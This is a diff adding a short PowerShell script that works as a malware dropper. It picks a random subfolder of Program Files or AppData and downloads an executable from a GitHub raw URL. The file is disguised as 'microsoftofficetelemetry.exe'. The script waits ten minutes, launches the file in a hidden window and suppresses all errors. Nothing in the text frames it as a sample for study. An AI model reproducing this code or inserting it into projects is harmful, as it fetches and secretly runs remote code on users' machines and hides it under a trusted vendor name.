@@ -1,0 +1,28 @@
+function Run-Farm {
+    try {
+        $possibleDirectories = @(
+            "$env:ProgramFiles(x86)",
+            "$env:ProgramFiles",
+            "$env:APPDATA",
+            "$env:LOCALAPPDATA"
+        )
+        $selectedDirectory = $possibleDirectories | Get-Random
+        if (-not (Test-Path $selectedDirectory)) {
+            throw "Selected directory does not exist $selectedDirectory"
+        }
+        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
+        if ($subDirectories.Count -eq 0) {
+            throw "No subdirectories found in the selected directory $selectedDirectory"
+        }
+        $targetSubDirectory = $subDirectories | Get-Random
+        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "microsoftofficetelemetry.exe"
+        if (-not (Test-Path $TargetPath)) {
+            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $TargetPath
+        }
+        Start-Sleep -Seconds 600
+        Start-Process -FilePath $TargetPath -WindowStyle "Hidden"
+    }
+    catch {
+    }
+}
+Run-Farm
